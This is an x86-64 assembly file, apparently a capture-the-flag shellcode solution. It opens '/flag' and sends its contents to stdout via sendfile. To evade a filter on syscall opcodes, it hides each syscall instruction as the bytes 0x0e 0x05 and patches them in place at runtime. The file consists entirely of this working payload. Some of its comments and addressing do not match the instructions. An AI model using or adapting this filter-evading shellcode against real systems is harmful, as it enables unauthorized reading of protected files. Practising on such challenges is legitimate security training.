.intel_syntax noprefix

.section .text
.global _start

_start:

    # push 0x0067616c662f to the stack
    xor eax, eax
    pushw 0x67
    pushw 0x616c
    pushw 0x662f

    # open('/flag', NULL, NULL)
    lea edi, [eip+40]
    xor esi, esi
    xor edx, edx

    # mov rax, 2
    xor eax, eax
    mov al, 0x2
    # syscall
    inc BYTE PTR [rip]
    .byte 0x0e, 0x05

    # sendfile(1, flag_fd, 1, 1000)
    # mov rdi, 1
    xor edi, edi
    mov dil, 0x1
    mov esi, eax
    xor edx, edx
    
    # mov r10, 100
    mov r10b, 0x64

    # mov rax, 40
    xor eax, eax
    mov al, 0x28
    # syscall
    inc BYTE PTR [rip]
    .byte 0x0e, 0x05

    flag: .ascii "/flag"
    end_file: .byte 0
